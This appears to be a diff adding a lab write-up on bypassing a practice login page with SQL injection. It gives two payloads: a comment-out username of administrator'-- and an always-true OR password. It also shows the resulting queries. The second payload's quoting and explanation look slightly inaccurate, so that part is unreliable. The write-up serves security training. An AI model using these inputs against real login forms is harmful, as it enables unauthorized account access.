@@ -1,0 +1,19 @@
+Lab 2: sqli bypass login
+
+Details: This lab contains an SQL injection vulnerability in the login function.
+
+To Do: To solve the lab, perform an SQL injection attack that logs in to the application as the administrator user. 
+
+Solution: 
+
+sol 1:
+	username: administrator'--
+	password: 1 (anything you want.)
+	Explanation: In username field"--" will comment out remaining part of the sql query.
+	Query: SELECT * FROM users WHERE username = 'administrator'--' AND password = ''   [' AND password = ''] this part is comment out.
+
+sol 2: 
+	username: administrator
+	password: 1 'OR' 1 '=' 1
+	Explanation: In password field 1=1 is always true and there is "OR" operation in the query. So, it is not a matter if the first part of the password is false or anything ultimately password field gives you true in the sql query.
+	Query: SELECT * FROM users WHERE username = 'administrator' AND password = '1 'OR' 1 '=' 1'   [1=1] gives you he true and because of "OR" operation password field gives you true.
